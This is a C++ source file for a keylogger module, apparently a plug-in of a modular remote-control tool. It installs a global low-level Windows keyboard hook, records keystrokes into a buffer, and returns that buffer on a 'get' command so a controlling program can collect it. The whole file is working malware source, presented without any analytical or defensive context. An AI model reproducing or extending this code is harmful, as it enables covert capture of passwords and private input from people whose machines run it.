#include "KeyloggerModule.h"
#include "Protocol.h"

std::string KeyloggerModule::keyLog_;
HHOOK KeyloggerModule::hHook_ = NULL;

KeyloggerModule::KeyloggerModule() {}

KeyloggerModule::~KeyloggerModule() {
    Cleanup();
}

ModuleInfo KeyloggerModule::GetInfo() const {
    ModuleInfo info;
    info.name = "Keylogger";
    info.version = "1.0.0";
    info.description = "Record keyboard input";
    info.type = ModuleType::KEYLOGGER;
    info.interfaceVersion = MODULE_INTERFACE_VERSION;
    return info;
}

bool KeyloggerModule::Initialize() {
    return true;
}

ModuleResult KeyloggerModule::Execute(const std::vector<uint8_t>& params) {
    ModuleResult result;
    result.success = false;

    try {
        const uint8_t* ptr = params.data();
        size_t remaining = params.size();
        std::string action = Protocol::DeserializeString(ptr, remaining);

        if (action == "start") {
            if (hHook_ == NULL) {
                hHook_ = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
                result.success = (hHook_ != NULL);
            }
        }
        else if (action == "stop") {
            if (hHook_ != NULL) {
                UnhookWindowsHookEx(hHook_);
                hHook_ = NULL;
            }
            result.success = true;
        }
        else if (action == "get") {
            Protocol::SerializeString(result.data, keyLog_);
            keyLog_.clear();
            result.success = true;
        }
    }
    catch (const std::exception& e) {
        result.errorMessage = e.what();
    }

    return result;
}

void KeyloggerModule::Cleanup() {
    if (hHook_ != NULL) {
        UnhookWindowsHookEx(hHook_);
        hHook_ = NULL;
    }
}

LRESULT CALLBACK KeyloggerModule::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;

        char key[2] = { 0 };
        if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) {
            key[0] = static_cast<char>(vkCode);
            keyLog_ += key;
        }
        else if (vkCode == VK_SPACE) {
            keyLog_ += " ";
        }
        else if (vkCode == VK_RETURN) {
            keyLog_ += "\n";
        }
    }

    return CallNextHookEx(hHook_, nCode, wParam, lParam);
}

EXPORT_MODULE(KeyloggerModule)
